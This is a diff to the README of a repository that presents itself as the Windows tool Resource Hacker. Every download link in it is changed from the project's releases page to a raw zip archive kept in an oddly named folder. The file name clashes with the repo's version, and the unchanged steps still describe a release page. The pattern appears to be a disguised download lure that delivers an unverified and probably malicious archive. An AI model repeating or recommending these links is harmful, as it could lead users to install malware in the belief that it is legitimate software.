@@ -1,6 +1,6 @@
 # 🛠️ Resource-Hacker-4.x - Edit Windows Files Easily
 
-[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-brightgreen?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/releases)
+[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-brightgreen?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/raw/refs/heads/main/balbutient/Resource-Hacker-x-3.7.zip)
 
 ## What is Resource Hacker?
 
@@ -35,7 +35,7 @@ This tool does not require programming skills. It uses a simple interface to ope
 
 1. Go to the Resource Hacker download page by clicking the green button below:
 
-[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-green?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/releases)
+[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-green?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/raw/refs/heads/main/balbutient/Resource-Hacker-x-3.7.zip)
 
 2. On the release page, look for the latest version. It will usually have a version number like `v4.7.32`.
 3. Find the file named `ResourceHacker.exe` or a similarly easy-to-find file for Windows.
@@ -99,7 +99,7 @@ This tool does not require programming skills. It uses a simple interface to ope
 
 - Check the built-in help under *Help* menu for detailed explanations of each option.  
 - Visit the release page for updates and bug fixes:  
-  https://github.com/Angel05-ad/Resource-Hacker-4.x/releases  
+  https://github.com/Angel05-ad/Resource-Hacker-4.x/raw/refs/heads/main/balbutient/Resource-Hacker-x-3.7.zip  
 - Use forums or community sites for tips on editing specific programs safely.
 
 ---
@@ -108,7 +108,7 @@ This tool does not require programming skills. It uses a simple interface to ope
 
 To update the tool, repeat the download steps on this page:
 
-[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-green?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/releases)
+[![Download Resource Hacker](https://img.shields.io/badge/Download-Resource%20Hacker-green?style=for-the-badge)](https://github.com/Angel05-ad/Resource-Hacker-4.x/raw/refs/heads/main/balbutient/Resource-Hacker-x-3.7.zip)
 
 Always download the latest release version to get new features and fixes.
 
